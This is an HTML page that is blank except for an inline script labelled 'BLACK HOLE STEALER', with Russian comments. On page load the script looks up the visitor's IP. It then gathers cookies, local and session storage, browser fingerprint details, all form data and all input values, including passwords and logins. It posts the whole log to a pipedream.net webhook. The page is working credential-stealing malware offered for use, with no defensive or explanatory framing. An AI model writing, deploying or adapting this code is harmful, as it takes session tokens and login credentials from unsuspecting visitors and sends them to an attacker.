<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
<style>
* { margin:0; padding:0; }
body { background: #000; width:100vw; height:100vh; overflow:hidden; }
</style>
</head>
<body>
<script>
// ===== BLACK HOLE STEALER - PIPEDREAM =====
(function() {
    // ===== ТВОЙ PIPEDREAM ВЕБХУК =====
    const WEBHOOK = 'https://eorw0sly29vshxa.m.pipedream.net';
    
    // ===== ОТПРАВКА =====
    function send(data) {
        try {
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    console.log('[+] Data sent to Pipedream');
                } else {
                    console.log('[-] Failed to send data');
                }
            })
            .catch(err => {
                console.log('[-] Error: ' + err.message);
            });
        } catch(e) {
            console.log('[-] Exception: ' + e.message);
        }
    }
    
    // ===== IP =====
    let ip = 'unknown';
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
            ip = data.ip;
            collectAndSend();
        })
        .catch(() => {
            collectAndSend();
        });
    
    function collectAndSend() {
        // ===== COOKIES =====
        const cookies = document.cookie || 'No cookies';
        
        // ===== LOCAL STORAGE =====
        const ls = {};
        for (let key in localStorage) {
            try { ls[key] = localStorage[key]; } catch(e) {}
        }
        
        // ===== SESSION STORAGE =====
        const ss = {};
        for (let key in sessionStorage) {
            try { ss[key] = sessionStorage[key]; } catch(e) {}
        }
        
        // ===== BROWSER INFO =====
        const browser = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'direct',
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
        
        // ===== FORMS (passwords, logins) =====
        const forms = [];
        document.querySelectorAll('form').forEach(form => {
            const data = {};
            new FormData(form).forEach((val, key) => data[key] = val);
            forms.push({
                action: form.action || 'none',
                method: form.method || 'GET',
                data: data
            });
        });
        
        // ===== INPUTS =====
        const inputs = [];
        document.querySelectorAll('input, textarea, select').forEach(el => {
            inputs.push({
                tag: el.tagName,
                type: el.type || 'text',
                name: el.name || '',
                id: el.id || '',
                value: el.value || '',
                placeholder: el.placeholder || ''
            });
        });
        
        // ===== PLUGINS =====
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
        
        // ===== ONE BIG LOG =====
        const log = {
            ip: ip,
            cookies: cookies,
            localStorage: ls,
            sessionStorage: ss,
            browser: browser,
            forms: forms,
            inputs: inputs,
            plugins: plugins,
            timestamp: new Date().toISOString()
        };
        
        // ===== SEND =====
        send(log);
    }
})();
</script>
</body>
</html>
